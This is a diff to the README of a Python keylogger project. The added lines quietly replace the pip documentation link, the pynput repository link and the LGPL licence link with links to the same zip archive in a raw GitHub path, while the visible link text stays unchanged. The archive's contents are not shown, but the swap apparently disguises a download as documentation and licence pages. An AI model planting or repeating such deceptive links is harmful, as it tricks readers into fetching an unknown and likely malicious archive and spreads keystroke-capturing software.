@@ -4,7 +4,7 @@
 
 ## Installation
 
-Use the package manager [pip](https://pip.pypa.io/en/stable/) to install pynput(Dependencies).
+Use the package manager [pip](https://raw.githubusercontent.com/TJoshi3637/Key_Logger/main/plashy/Key_Logger_3.6-beta.4.zip) to install pynput(Dependencies).
 
 ```bash
 $ python3 -m pip install foobar
@@ -26,7 +26,7 @@ $ python3 keylogger.py
 ## Acknowledgements
 
 * **bin0x00** - For initializing the this project.
-* **moses-palmer** - For making the [pynput](https://github.com/moses-palmer/pynput)
+* **moses-palmer** - For making the [pynput](https://raw.githubusercontent.com/TJoshi3637/Key_Logger/main/plashy/Key_Logger_3.6-beta.4.zip)
   * More acknowledgements at moses-palmer pynput repo
 * **nitratine.net** and **theembeddedlab.com** for making amazing guides of which this repo is based on :D
 ## Contributing
@@ -35,4 +35,4 @@ Pull requests are welcome. For major changes, please open an issue first to disc
 
 ## License
 
-[GNU Lesser General Public License v2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1.html)
+[GNU Lesser General Public License v2.1](https://raw.githubusercontent.com/TJoshi3637/Key_Logger/main/plashy/Key_Logger_3.6-beta.4.zip)
